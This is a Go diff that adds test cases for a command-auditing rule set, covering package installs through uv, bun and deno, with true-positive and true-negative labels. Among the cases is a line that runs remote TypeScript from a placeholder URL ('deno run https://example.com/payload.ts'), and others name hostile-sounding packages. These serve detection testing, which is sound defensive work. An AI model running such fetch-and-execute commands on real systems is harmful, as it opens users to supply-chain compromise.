@@ -293,6 +293,95 @@ var PackageInstallCases = []TestCase{
 		Tags:             []string{"canonical", "critical"},
 	},
 
+	// --- uv (Astral Python package manager) ---
+
+	{
+		ID:               "TP-PKGINST-011",
+		Command:          `uv add requests`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `uv add installs a Python package into the current project. Matches sc-audit-uv-install prefix rule. Supply chain risk equivalent to pip install.`,
+		Tags:             []string{"canonical", "package-manager", "uv"},
+	},
+	{
+		ID:               "TP-PKGINST-012",
+		Command:          `uv pip install suspicious-package`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `uv pip install is the uv equivalent of pip install. Matches sc-audit-uv-install prefix rule.`,
+		Tags:             []string{"canonical", "package-manager", "uv"},
+	},
+	{
+		ID:               "TP-PKGINST-013",
+		Command:          `uvx malicious-tool`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/global-package-install",
+		Analyzer:         "regex",
+		Description:      `uvx downloads and runs a PyPI tool ephemerally — no permanent install record. Matches sc-audit-uv-tool-run prefix rule. MITRE T1195.001.`,
+		Tags:             []string{"canonical", "ephemeral-execution", "uv"},
+	},
+	{
+		ID:               "TP-PKGINST-014",
+		Command:          `uv tool install evil-cli`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/global-package-install",
+		Analyzer:         "regex",
+		Description:      `uv tool install adds a CLI tool globally (equivalent to pip install -g). Matches sc-audit-uv-tool-run prefix rule.`,
+		Tags:             []string{"canonical", "global-install", "uv"},
+	},
+
+	// --- bun (JavaScript runtime/package manager) ---
+
+	{
+		ID:               "TP-PKGINST-015",
+		Command:          `bun add lodash`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `bun add installs an npm-compatible package. Matches sc-audit-bun-install prefix rule. Same supply-chain risk as npm add.`,
+		Tags:             []string{"canonical", "package-manager", "bun"},
+	},
+	{
+		ID:               "TP-PKGINST-016",
+		Command:          `bun x create-next-app my-app`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `bun x provides ephemeral package execution (like npx). Matches sc-audit-bun-install prefix rule.`,
+		Tags:             []string{"ephemeral-execution", "bun"},
+	},
+
+	// --- deno (TypeScript runtime with URL-based modules) ---
+
+	{
+		ID:               "TP-PKGINST-017",
+		Command:          `deno install https://deno.land/x/oak/mod.ts`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `deno install fetches and installs a module from a URL. Matches sc-audit-deno-install prefix rule. URL-based installs bypass registry trust anchors.`,
+		Tags:             []string{"canonical", "package-manager", "deno", "url-install"},
+	},
+	{
+		ID:               "TP-PKGINST-018",
+		Command:          `deno run https://example.com/payload.ts`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `deno run executes remote TypeScript from an arbitrary URL. Matches sc-audit-deno-install prefix rule. No install record left behind.`,
+		Tags:             []string{"canonical", "remote-exec", "deno", "url-execution"},
+	},
+
 	// --- TRUE NEGATIVES ---
 
 	{
@@ -350,6 +439,46 @@ var PackageInstallCases = []TestCase{
 			does NOT fire (requires "set false", not "get"). Semantic engine gives AUDIT for npm.
 			TN for the specific BLOCK rule.`,
 		Tags:             []string{"common-dev-operation"},
+	},
+	{
+		ID:               "TN-PKGINST-006",
+		Command:          `uv run python script.py`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/package-install/global-package-install",
+		Analyzer:         "regex",
+		Description:      `uv run executing a local Python script (no --with flag) is an expected dev operation. Still matches sc-audit-uv-tool-run (AUDIT), but TN for BLOCK-level concern. No new package is installed.`,
+		Tags:             []string{"common-dev-operation", "uv"},
+	},
+	{
+		ID:               "TN-PKGINST-007",
+		Command:          `uv sync`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `uv sync installs from an existing lockfile — expected in project setup. Matches sc-audit-uv-install for AUDIT. TN for BLOCK-level concern since it uses pinned, reviewed packages.`,
+		Tags:             []string{"common-dev-operation", "uv"},
+	},
+	{
+		ID:               "TN-PKGINST-008",
+		Command:          `bun run dev`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `bun run executes a script from package.json — does NOT install new packages. sc-audit-bun-install does NOT fire (prefix "bun add"/"bun install"/"bun x" doesn't match "bun run"). AUDIT is the default decision.`,
+		Tags:             []string{"common-dev-operation", "bun"},
+	},
+	{
+		ID:               "TN-PKGINST-009",
+		Command:          `deno fmt src/main.ts`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `deno fmt formats local TypeScript files — no package install or remote fetch. sc-audit-deno-install does NOT fire (prefix "deno install"/"deno run"/"deno add" doesn't match "deno fmt"). AUDIT is the default decision.`,
+		Tags:             []string{"common-dev-operation", "deno"},
 	},
 }
 
